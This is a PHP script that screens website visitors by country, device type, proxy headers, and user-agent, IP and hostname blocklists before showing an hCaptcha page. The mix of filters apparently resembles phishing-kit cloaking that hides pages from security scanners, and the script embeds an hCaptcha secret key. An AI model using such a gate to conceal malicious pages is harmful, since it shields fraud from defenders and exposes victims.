<?php

include 'config.php';
$config = include 'config.php';
include 'useragents.php';
include 'ips.php';
include 'hostnames.php';

function getVisitorIp() {
    foreach ([
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ] as $key) {
        if (array_key_exists($key, $_SERVER) && filter_var($_SERVER[$key], FILTER_VALIDATE_IP)) {
            return $_SERVER[$key];
        }
    }
    return '0.0.0.0';
}

function isMobile() {
    return preg_match('/Mobile|Android|iPhone|iPad|iPod/i', $_SERVER['HTTP_USER_AGENT']);
}

function verifyCountry($ip, $allowedCountries) {
    $geoData = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    return in_array($geoData->geoplugin_countryCode, $allowedCountries);
}

function blockProxy() {
    return !empty($_SERVER['HTTP_VIA']) || !empty($_SERVER['HTTP_X_FORWARDED_FOR']);
}

function verifyUserAgent($agent, $disallowed) {
    foreach ($disallowed as $word) {
        if (stripos($agent, $word) !== false) {
            return false;
        }
    }
    return true;
}

function verifyIP($ip, $disallowed) {
    foreach ($disallowed as $pattern) {
        if (fnmatch($pattern, $ip)) {
            return false;
        }
    }
    return true;
}

function verifyHostname($hostname, $blockedWords) {
    foreach ($blockedWords as $word) {
        if (stripos($hostname, $word) !== false) {
            return false;
        }
    }
    return true;
}

function verifyCaptcha($response) {
    $data = [
        'secret' => 'ES_4a0bc203624344edaf9949af392b0b87',
        'response' => $response
    ];

    $verify = curl_init();
    curl_setopt($verify, CURLOPT_URL, "https://hcaptcha.com/siteverify");
    curl_setopt($verify, CURLOPT_POST, true);
    curl_setopt($verify, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($verify, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($verify);
    curl_close($verify);

    $responseData = json_decode($response);
    return $responseData && $responseData->success;
}

function logIp($file, $ip) {
    $existingIps = file_exists($file) ? file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
    if (!in_array($ip, $existingIps)) {
        file_put_contents($file, $ip . PHP_EOL, FILE_APPEND);
    }
}

$ip = getVisitorIp();
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$hostname = gethostbyaddr($ip);


if (file_exists('bad_ips.txt') && in_array($ip, file('bad_ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))) {
    header('Location: /error/ip.html');
    exit;
}
if (file_exists('good_ips.txt') && in_array($ip, file('good_ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))) {
    include 'captcha.php';
    exit;
}

if ($config['mobile_only'] && !isMobile()) {
    logIp('bad_ips.txt', $ip);
    header('Location: /error/mobile.html');
    exit;
}

if (!verifyCountry($ip, $config['allow_countries'])) {
    logIp('bad_ips.txt', $ip);
    header('Location: /error/country.html');
    exit;
}

if ($config['block_proxies'] && blockProxy()) {
    logIp('bad_ips.txt', $ip);
    header('Location: /error/proxy.html');
    exit;
}

if ($config['verify_user_agent'] && !verifyUserAgent($agent, $disallowedUserAgents)) {
    logIp('bad_ips.txt', $ip);
    header('Location: /error/useragent.html');
    exit;
}

if (!verifyIP($ip, $disallowedIPs)) {
    logIp('bad_ips.txt', $ip);
    header('Location: /error/ip.html');
    exit;
}

if (!verifyHostname($hostname, $blockedHostnames)) {
    logIp('bad_ips.txt', $ip);
    header('Location: /error/hostname.html');
    exit;
}

logIp('good_ips.txt', $ip);

if ($config['captcha_enabled'] && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!verifyCaptcha($_POST['h-captcha-response'] ?? '')) {
        echo 'CAPTCHA validation failed. Please try again.';
        exit;
    } else {
        header('Location: /success.html');
        exit;
    }
}

include 'captcha.php';
exit;

?>
